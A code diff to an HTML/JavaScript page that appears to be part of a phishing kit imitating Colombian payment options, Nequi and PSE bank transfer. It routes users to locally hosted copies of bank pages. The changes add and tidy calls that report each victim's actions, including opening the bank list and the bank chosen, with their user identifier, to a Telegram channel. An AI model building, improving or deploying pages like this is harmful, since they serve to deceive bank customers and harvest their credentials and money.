@@ -137,7 +137,7 @@
   </div>
 
   <div class="section">
-    <div class="card" onclick="redirigirYNotificar('nequi hope/neq.html', 'Nequi')">
+    <div class="card" onclick="redirigirYNotificar('nequi_hope/neq.html', 'Nequi')">
       <div class="card-left">
         <img src="https://play-lh.googleusercontent.com/iniSgahzDNcS2zK-9LYYOdyNeXUF35cHCLLZo6M1ZKvDvblhPvoBPaNNYUZ5Jhc5aA=w240-h480-rw" alt="Nequi Logo" />
         <span class="card-title">Nequi</span>
@@ -248,15 +248,18 @@
 
     function togglePSE() {
       const dropdown = document.getElementById("pseDropdown");
-      dropdown.style.display = dropdown.style.display === "none" ? "block" : "none";
+      const isOpen = dropdown.style.display === "block";
+      dropdown.style.display = isOpen ? "none" : "block";
+      if (!isOpen) {
+        notificarTelegram(`📂 PSE desplegado\n👤 Usuario: ${usuario}`);
+      }
     }
 
     function redireccionarPSE() {
       const banco = document.getElementById("bancoPSE").value;
       if (banco) {
         localStorage.setItem("bancoSeleccionado", banco);
-        const mensaje = `🏦 Banco seleccionado (PSE): ${banco}\n👤 Usuario: ${usuario}`;
-        notificarTelegram(mensaje);
+        notificarTelegram(`🏦 Banco seleccionado (PSE): ${banco}\n👤 Usuario: ${usuario}`);
         setTimeout(() => {
           window.location.href = `PSEUserRegister/index.html?next=bpse/${banco}/index.html`;
         }, 500);
@@ -280,6 +283,7 @@
       const s = String(ahora.getSeconds()).padStart(2, '0');
       document.getElementById("hora").textContent = `${h}:${m}:${s}`;
     }
+
     setInterval(actualizarHora, 1000);
     actualizarHora();
   </script>
